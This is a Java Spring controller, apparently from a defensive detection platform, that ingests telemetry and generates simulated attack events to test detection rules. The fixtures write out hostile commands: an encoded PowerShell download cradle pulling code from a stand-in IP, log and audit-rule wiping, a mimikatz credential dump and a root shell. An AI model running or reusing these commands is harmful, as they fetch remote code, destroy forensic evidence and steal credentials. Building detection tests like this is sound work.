package com.blueops.telemetry;

import com.blueops.findings.FindingDto;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import java.util.*;

@RestController
@RequestMapping("/api/v1/telemetry")
public class TelemetryController {

    private final EventNormalizationService normalizationService;
    private final DetectionEvaluationService evaluationService;

    public TelemetryController(EventNormalizationService normalizationService, DetectionEvaluationService evaluationService) {
        this.normalizationService = normalizationService;
        this.evaluationService = evaluationService;
    }

    @PostMapping("/ingest")
    @PreAuthorize("hasAnyRole('ADMIN', 'ANALYST')")
    public ResponseEntity<Map<String, Object>> ingestTelemetry(@RequestBody Object payload) {
        List<Map<String, Object>> rawEvents = new ArrayList<>();
        if (payload instanceof List<?> list) {
            for (Object item : list) {
                if (item instanceof Map<?, ?> map) {
                    @SuppressWarnings("unchecked")
                    Map<String, Object> castMap = (Map<String, Object>) map;
                    rawEvents.add(castMap);
                }
            }
        } else if (payload instanceof Map<?, ?> map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> castMap = (Map<String, Object>) map;
            rawEvents.add(castMap);
        }

        int normalizedCount = 0;
        int findingsCount = 0;
        List<FindingDto> newFindings = new ArrayList<>();

        for (Map<String, Object> raw : rawEvents) {
            NormalizedEvent event = normalizationService.normalize(raw);
            if (event != null) {
                normalizedCount++;
                List<FindingDto> findings = evaluationService.evaluate(event);
                findingsCount += findings.size();
                newFindings.addAll(findings);
            }
        }

        Map<String, Object> response = new HashMap<>();
        response.put("status", "SUCCESS");
        response.put("received", rawEvents.size());
        response.put("normalized", normalizedCount);
        response.put("findingsGenerated", findingsCount);
        response.put("findings", newFindings);

        return ResponseEntity.ok(response);
    }

    @GetMapping("/events")
    @PreAuthorize("hasAnyRole('ADMIN', 'ANALYST', 'VIEWER')")
    public ResponseEntity<List<NormalizedEvent>> getRecentEvents(@RequestParam(defaultValue = "50") int limit) {
        return ResponseEntity.ok(normalizationService.getRecentEvents(limit));
    }

    @GetMapping("/stats")
    @PreAuthorize("hasAnyRole('ADMIN', 'ANALYST', 'VIEWER')")
    public ResponseEntity<Map<String, Object>> getTelemetryStats() {
        return ResponseEntity.ok(normalizationService.getTelemetryStats());
    }

    @PostMapping("/simulate-attack")
    @PreAuthorize("hasAnyRole('ADMIN', 'ANALYST')")
    public ResponseEntity<Map<String, Object>> simulateAttack(@RequestBody Map<String, String> request) {
        String scenario = request.getOrDefault("scenario", "C002");
        List<Map<String, Object>> attackEvents = generateAttackEvents(scenario);

        int findingsCount = 0;
        List<FindingDto> allFindings = new ArrayList<>();
        for (Map<String, Object> raw : attackEvents) {
            NormalizedEvent event = normalizationService.normalize(raw);
            if (event != null) {
                List<FindingDto> findings = evaluationService.evaluate(event);
                findingsCount += findings.size();
                allFindings.addAll(findings);
            }
        }

        Map<String, Object> res = new HashMap<>();
        res.put("scenario", scenario);
        res.put("eventsInjected", attackEvents.size());
        res.put("findingsGenerated", findingsCount);
        res.put("findings", allFindings);
        res.put("message", "Simulated attack sequence successfully ingested and evaluated against detection engine.");
        return ResponseEntity.ok(res);
    }

    private List<Map<String, Object>> generateAttackEvents(String scenario) {
        List<Map<String, Object>> events = new ArrayList<>();
        long now = System.currentTimeMillis();

        if ("C002".equalsIgnoreCase(scenario) || "windows-chain".equalsIgnoreCase(scenario)) {
            // Stage 1: Office document spawning cmd.exe (D009)
            events.add(Map.of(
                    "id", "sim-win-" + now + "-1",
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "ParentImage", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                    "Image", "C:\\Windows\\System32\\cmd.exe",
                    "CommandLine", "cmd.exe /c powershell -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
                    "username", "analyst.dev",
                    "provider", "Sysmon",
                    "EventID", 1
            ));

            // Stage 2: Suspicious Encoded PowerShell execution (D008)
            events.add(Map.of(
                    "id", "sim-win-" + now + "-2",
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "ParentImage", "C:\\Windows\\System32\\cmd.exe",
                    "Image", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "CommandLine", "powershell.exe -noni -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC4yNDo0NDQ0L3BsYXlsb2FkJyk=",
                    "username", "analyst.dev",
                    "provider", "Sysmon",
                    "EventID", 1
            ));

            // Stage 3: Outbound egress to non-standard port 4444 (D014) + Threat Intel IP 198.51.100.24 (D015)
            events.add(Map.of(
                    "id", "sim-win-" + now + "-3",
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "dest_ip", "198.51.100.24",
                    "dest_port", 4444,
                    "src_ip", "192.168.56.101",
                    "src_port", 51234,
                    "domain", "c2-update.adversary-lab.internal",
                    "provider", "Suricata",
                    "action", "c2_egress_traffic"
            ));

            // Stage 4: Windows Event Log Clearing (D012)
            events.add(Map.of(
                    "id", "sim-win-" + now + "-4",
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "ParentImage", "C:\\Windows\\System32\\cmd.exe",
                    "Image", "C:\\Windows\\System32\\wevtutil.exe",
                    "CommandLine", "wevtutil.exe cl Security",
                    "username", "SYSTEM",
                    "provider", "Sysmon",
                    "EventID", 1
            ));
        } else if ("C001".equalsIgnoreCase(scenario) || "linux-compromise".equalsIgnoreCase(scenario)) {
            // Stage 1: Repeated SSH Auth Failures (D001)
            for (int i = 0; i < 3; i++) {
                events.add(Map.of(
                        "id", "sim-lnx-" + now + "-auth-" + i,
                        "hostname", "LNX-PROD-SRV-01",
                        "host_ip", "192.168.56.102",
                        "username", "root",
                        "provider", "Linux-auditd",
                        "action", "failed_login",
                        "original", "type=USER_AUTH res=failed acct=root addr=203.0.113.88"
                ));
            }

            // Stage 2: Sudo interactive root shell (D004)
            events.add(Map.of(
                    "id", "sim-lnx-" + now + "-sudo",
                    "hostname", "LNX-PROD-SRV-01",
                    "host_ip", "192.168.56.102",
                    "username", "deploy",
                    "CommandLine", "sudo /bin/bash",
                    "provider", "Linux-auditd",
                    "action", "privileged_execution"
            ));

            // Stage 3: Audit log tampering auditctl -D (D006)
            events.add(Map.of(
                    "id", "sim-lnx-" + now + "-auditctl",
                    "hostname", "LNX-PROD-SRV-01",
                    "host_ip", "192.168.56.102",
                    "username", "root",
                    "CommandLine", "auditctl -D",
                    "provider", "Linux-auditd",
                    "action", "audit_tamper"
            ));
        } else if ("credential-dump".equalsIgnoreCase(scenario)) {
            // LSASS memory dump (D011)
            events.add(Map.of(
                    "id", "sim-dump-" + now,
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "Image", "C:\\Temp\\mimikatz.exe",
                    "CommandLine", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                    "username", "SYSTEM",
                    "provider", "Sysmon",
                    "EventID", 1
            ));
        } else {
            // Generic IOC hit
            events.add(Map.of(
                    "id", "sim-ioc-" + now,
                    "hostname", "WIN-WORKSTATION-01",
                    "host_ip", "192.168.56.101",
                    "dest_ip", "198.51.100.24",
                    "dest_port", 443,
                    "domain", "evil-c2-testing.org",
                    "provider", "Suricata",
                    "action", "dns_query"
            ));
        }

        return events;
    }
}
